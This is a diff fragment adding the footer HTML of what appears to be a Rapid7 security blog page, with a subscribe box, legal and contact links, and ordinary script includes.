+                    <img src="/assets/images/up-arrow.png?v=a11ed6eaa3"><span>BACK TO TOP</span>
+                </a>
+            </div>
+            <div class="subscribe-footer">
+                <h4>Never miss a blog</h4>
+                <p>Get the latest stories, expertise, and news about security today.</p>
+                <a class="subscribe-btn button blue smBtn">Subscribe</a>
+            </div>
+        </div>     
+    </div>
+
+    <footer class="footer clearfix">
+        <div class="row expanded">
+            <div class="columns medium-10 medium-offset-1">
+                <div class="copyright">&copy; <script>document.write(new Date().getFullYear())</script> Rapid7</div>
+                <div class="footer-nav">
+                    <ul>
+                        <li><a href="https://www.rapid7.com/legal" title="Legal Terms">Legal Terms</a></li>
+                        <li><a href="https://www.rapid7.com/privacy-policy" title="Privacy Policy">Privacy Policy</a></li>
+                        <li><a href="https://www.rapid7.com/export-notice" title="Export Notice">Export Notice</a></li>
+                        <li><a href="https://www.rapid7.com/trust" title="Trust">Trust</a></li>   
+                        <li><a href="https://www.rapid7.com/contact" title="Conact Us">Contact Us</a></li>
+                        <li><a href="https://www.rapid7.com/careers" title="Careers">Careers</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </footer>
+    
+    <script type="text/javascript" src="https://www.rapid7.com/includes/js/jquery.min.js"></script>
+    
+    <script type="text/javascript" src="/assets/js/ghost-content-api.min.js?v=a11ed6eaa3"></script>
+    <script type="text/javascript" src="/assets/js/all.js?v=a11ed6eaa3"></script>
+    <script type="text/javascript" id="dsq-count-scr" src="https://rapid7.disqus.com/count.js" async></script>
+
+    <script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script>
+
+</body>
+</html>
